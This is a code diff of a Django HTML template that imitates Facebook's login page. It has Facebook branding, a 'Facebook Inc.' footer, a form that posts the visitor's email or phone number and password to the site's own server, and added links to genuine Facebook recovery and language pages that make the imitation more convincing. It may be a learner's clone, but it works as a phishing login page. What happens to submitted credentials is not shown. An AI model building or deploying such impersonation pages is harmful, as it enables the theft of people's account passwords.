@@ -8,11 +8,13 @@
     <meta name="description" content="">
     <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
     <meta name="generator" content="Hugo 0.88.1">
-    <title>Facebook - log in or sing up</title>
+    <title> Facebook - log in or sing up</title>
+    <link rel="shortcut icon" href="R.jpg" type="image/x-icon">
+    
 
     <link rel="canonical" href="https://getbootstrap.com/docs/5.1/examples/sign-in/">
 
-    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta2/css/all.min.css" integrity="sha512-YWzhKL2whUzgiheMoBFwW8CKV4qpHQAEuvilg9FAn5VJUDwKZZxkJNuGM4XkWuk94WCrrwslk8yWNGmY1EduTA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 
     <!-- Bootstrap core CSS -->
 <link  rel="stylesheet" href="{% static 'dist/css/bootstrap.min.css'%}">
@@ -31,6 +33,35 @@
           font-size: 3.5rem;
         }
       }
+      
+      @media (max-width: 768px) {
+        .bd-placeholder-img-lg {
+          font-size: 3.5rem;
+        }
+        .create{
+        max-width: 226px;
+      }
+      .fbdesc{
+        font-size: 20px;
+      }
+      }
+      input::placeholder {
+    font-size: 16px;
+    padding: 0;
+   
+}
+
+li{
+  list-style: none;
+} 
+ul li a{
+  text-decoration: none;
+  font-size: 15px;
+}
+.ico{
+  font-size:22px;
+  margin-top:5px
+}
     </style>
 
     
@@ -50,11 +81,11 @@
 
 
     
-      <div class="container px-5 pb-5">
-            <form method="post" enctype="multipart/form-data" class="px-3 py-3 bg-white rounded mt-5">
+      <div class="container pb-5">
+            <form method="post" enctype="multipart/form-data" class="px-2 py-3 rounded mt-5">
                {% csrf_token %}
                
-                <input type="email" name="emailNum" class="mb-2 form-control text-muted p-3" placeholder="Enter your email address or phone number" value="">
+                <input type="email" name="emailNum" class="mb-2 form-control text-muted p-3 mb-2" placeholder="Enter email address or phone number" value="">
 
                 <input name="password" type="password" class="form-control text-muted p-3" placeholder="Password" value="">
                 
@@ -63,16 +94,47 @@
               <button class="mt-3 mb-3 w-100 btn btn-lg btn-primary" type="submit">Log In</button>
 
 
-              <a class="mt-5 mb-3 forgot text-primary">Forgotten password?</a>
+              <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjM0MjMxMTcyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login" class="mt-5 mb-3 forgot text-primary">Forgotten password?</a>
           <hr>
-          <button class="w-100 btn btn-lg succsess">Create New Account</button>
+          <button class="w-100 btn btn-lg succsess create">Create New Account</button>
             </form>
         
          <div class="footer mt-3">
-            <a class="mt-3" href="#">Create a Page </a><small class="mt-3">for a celebrity, band or business.</small>
+            <a class="mt-3" href="">Create a Page </a><small class="mt-3">for a celebrity, band or business.</small>
          </div>
       </div>
 
 
+      <div class="container">
+        <div class="row">
+          <div class="col-6">
+            <ul class="text-muted">
+              <li><a class="text-muted" href="#">English (UK)</a></li>
+              <li><a class="text-muted" href="https://as-in.facebook.com/?stype=lo&jlou=Afe6I6bM5jrmnMEMAm_6Zq4FHwo4V15f7BygCeRN8_BTsj2e0bJSYEOReRfy8kJR_tzHvVWf2wCqdUX5fjlBA62g-aHRXRht48CMjFCCZ_k9dw&smuh=45231&lh=Ac84ns4rlGsgTpfPPr8">অসমীয়া
+              </a></li>
+              <li><a class="text-muted" href="#">नेपाली
+              </a></li>
+              <li><a class="text-muted" href="#">Português (Brasil)
+              </a></li>
+            </ul>
+          </div>
+          <div class="col-6">
+            <ul>
+              <li><a class="text-muted" href="https://bn-in.facebook.com/?stype=lo&jlou=Afe6I6bM5jrmnMEMAm_6Zq4FHwo4V15f7BygCeRN8_BTsj2e0bJSYEOReRfy8kJR_tzHvVWf2wCqdUX5fjlBA62g-aHRXRht48CMjFCCZ_k9dw&smuh=45231&lh=Ac84ns4rlGsgTpfPPr8">বাংলা
+              </a></li>
+              <li><a class="text-muted" href="https://hi-in.facebook.com/?stype=lo&jlou=Afe6I6bM5jrmnMEMAm_6Zq4FHwo4V15f7BygCeRN8_BTsj2e0bJSYEOReRfy8kJR_tzHvVWf2wCqdUX5fjlBA62g-aHRXRht48CMjFCCZ_k9dw&smuh=45231&lh=Ac84ns4rlGsgTpfPPr8">हिन्दी
+              </a></li>
+              <li><a class="text-muted" href="https://es-la.facebook.com/?stype=lo&jlou=Afe6I6bM5jrmnMEMAm_6Zq4FHwo4V15f7BygCeRN8_BTsj2e0bJSYEOReRfy8kJR_tzHvVWf2wCqdUX5fjlBA62g-aHRXRht48CMjFCCZ_k9dw&smuh=45231&lh=Ac84ns4rlGsgTpfPPr8">Español
+              </a></li>
+              <li><a class="text-muted" href="#"><i class="far fa-plus-square ico"></i></a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+<div class="container py-2">
+      <div class="text-center ">
+        <small class="text-muted ">Facebook Inc.</small>
+      </div>
+    </div>
   </body>
 </html>
